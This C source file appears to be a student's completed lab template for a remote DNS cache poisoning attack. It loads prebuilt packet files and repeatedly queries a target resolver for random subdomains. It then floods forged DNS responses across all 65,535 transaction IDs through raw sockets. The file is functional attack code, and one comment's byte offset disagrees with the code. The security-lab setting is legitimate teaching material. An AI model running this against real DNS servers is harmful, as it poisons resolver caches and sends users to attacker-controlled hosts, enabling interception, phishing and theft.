#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request( );
void send_dns_response( );

int main()
{
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("packets/ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'packets/ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("packets/ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'packets/ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[5];
    printf("random subname: ");
    for (int k=0; k<5; k++){
      name[k] = a[rand() % 26];
      printf("%c", name[k]);
    }
    printf("\n");


    //##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */

    // checking from wireshark, we could find that the subnet part starts from 2+8*5+3
    int req_subnet_start = 2+8*5-1;
    for(int i=0; i<5;i++){
      ip_req[req_subnet_start+i] = name[i];
    }

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    
    // checking from wireshark, we could find that the transaction part starts from 2+8*3+2
    int resp_transation_start = 2+8*3+2;
    uint16_t * trans_ptr = (uint16_t *) (ip_resp + resp_transation_start);

    // the subnet part starts from 2+8*5+3
    int resp_subnet_start = 2+8*5-1;
    int resp_subnet_start_2 = 2+8*8-2;
    for(int i=0; i<5;i++){
      ip_resp[resp_subnet_start+i] = name[i];
      ip_resp[resp_subnet_start_2+i] = name[i];
    }
    
    send_raw_packet(ip_req, n_req);
    // send_raw_packet(ip_resp, n_resp);
    for(uint16_t i = 0; i < 0xffff; i++){
      *trans_ptr = i;
      // printf("%d\n", *trans_ptr);
      send_raw_packet(ip_resp, n_resp);
      // break;
    }

    // break;

    //##################################################################
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request()
{
  // Students need to implement this function
}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response()
{
  // Students need to implement this function
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
